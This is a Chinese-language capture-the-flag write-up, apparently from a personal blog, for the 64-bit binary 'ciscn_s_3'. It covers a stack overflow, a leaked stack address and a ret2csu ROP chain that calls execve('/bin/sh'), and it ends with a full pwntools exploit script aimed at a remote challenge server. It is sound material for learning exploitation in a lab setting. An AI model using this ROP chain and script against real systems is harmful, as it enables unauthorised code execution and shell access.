首先checksec

![image-20201106160828730](https://static.hack1s.fun/images/2021/02/06/image-20201106160828730.png)

开启了NX的64位程序

这个程序比较奇怪，反编译了vuln函数之后可以看到

![image-20201106161721030](https://static.hack1s.fun/images/2021/02/06/image-20201106161721030.png)

是调用了一次read，一次write

但这里没法直接看到具体调用的参数，用gdb跑起来看一下

跑到read这里的时候的三个参数分别是

![image-20201106161814576](https://static.hack1s.fun/images/2021/02/06/image-20201106161814576.png)

```C
read(0,buf,0x400);
```

也就是说从stdin读了最多0x400到栈上

之后又调用了write函数，执行到这里的时候各个参数为

![image-20201106162215451](https://static.hack1s.fun/images/2021/02/06/image-20201106162215451.png)

```c
write(1,buf,0x30);
```

也就是说从栈上的buf将0x30长度的内容写到stdout上

但是这个vuln函数向下执行的时候就没办法正常的返回了，因为栈上已经都是'a'了

计算一下偏移，81-65=16

由于开启了NX，这个明显要用ROP了

由于是64位的程序，很可能是ret2csu

另外程序还给了一个gadget的函数，里面存在几个可以用到的gadget

![image-20201106221342423](https://static.hack1s.fun/images/2021/02/06/image-20201106221342423.png)

这一个函数中给到了三个gadget

这里给出的一个`mov rax,3Bh; retn`

之后可以尝试去调用`syscall`，因为`3Bh`对应的59在系统调用号中正好是`execve`

![image-20201106221705844](https://static.hack1s.fun/images/2021/02/06/image-20201106221705844.png)

全部的系统调用号对应表：[https://www.cnblogs.com/tcctw/p/11450449.html](https://www.cnblogs.com/tcctw/p/11450449.html)

如果我们想要执行`execve("/bin/sh")`，那么就需要在栈中存储这个字符串，之后将这个字符串的地址赋给rdi，最后调用execve

在执行到write的那个syscall时，栈中rsi指向了栈中的buffer

![image-20201106225441796](https://static.hack1s.fun/images/2021/02/06/image-20201106225441796.png)

由于这里输出的是0x30的内容，此时栈顶是从上面字符串c开始的位置

![image-20201106225608750](https://static.hack1s.fun/images/2021/02/06/image-20201106225608750.png)

因此输出0x30的内容的话，会将栈中另外两个内容输出出来，这其中恰好有一个是指向栈上的地址

在上面的图中就是`0x00007fffffffde38`以及另外一个`0x0000000100000000`

这个`de38`距离我们字符串的开头`dd20`相差了`0x118`

我们就可以用得到的这个值进行定位



至于调用execve的过程，首先将rax设置为execve的调用号

之后ret回来之后设置一下几个寄存器中的值

需要注意的是，execve函数在调用时，实际上需要三个参数，最开始尝试直接运行`execve('/bin/sh')`失败了，网上查了说后面两个参数需要为0，也就是说在运行时我们需要令`rdi=*"/bin/sh"`, `rsi=0`, `rdx=0`

但是在gadget中搜索没有找到为rdx赋值的gadget

我们就只能是用到ret2csu来控制rdx的值了

首先执行`__libc_start_main`中的后面一部分pop

![image-20201107111533619](https://static.hack1s.fun/images/2021/02/06/image-20201107111533619.png)

之后执行前面那一块的mov

![image-20201107111556821](https://static.hack1s.fun/images/2021/02/06/image-20201107111556821.png)

这里我们的目的是给rdx赋值，所以需要控制r13

由于我们设置rbx=0，实际上call的位置就是r12寄存器控制的，这里设置r12的值为栈上当前下一个地址，即pop_rdi的地址

```python
payload = '/bin/sh\x00'*2 + p64(rax_3b) 
payload += p64(csu_pop) + p64(0) + p64(1) + p64(r12) + p64(0) + p64(0) + p64(r15)
payload += p64(csu_mov)
payload += p64(pop_rdi) + p64(payload_addr) + p64(syscall_addr)
```

写的时候发现一个问题就是第一次payload回来的位置不对，这个程序经过了一次调用vuln，所以回来的地址应该是`elf.sym['vuln']`，之前写成`main`就错了

```python
from pwn import *

io = remote('node3.buuoj.cn',29878)
#io = process('./ciscn_s_3')
elf = ELF('./ciscn_s_3')

main = elf.sym['vuln']
syscall_addr = 0x400517


payload = '/bin/sh\x00'*2 + p64(main)

io.sendline(payload)
io.recv(0x20)
payload_addr = u64(io.recv(0x8)) - 0x118
print('payload address is:',hex(payload_addr))
io.recv(0x8)

rax_3b = 0x4004e2
pop_rdi = 0x4005a3

csu_pop = 0x40059A
csu_mov = 0x400580

payload = '/bin/sh\x00'*2 + p64(rax_3b)
payload += p64(csu_pop) + p64(0) + p64(0) + p64(payload_addr + 0x58) + p64(0) + p64(0) + p64(0)
payload += p64(csu_mov)
payload += p64(pop_rdi) + p64(payload_addr) + p64(syscall_addr)

io.sendline(payload)
io.interactive()
```

这个题目还可以用SROP来做，之后有机会再写。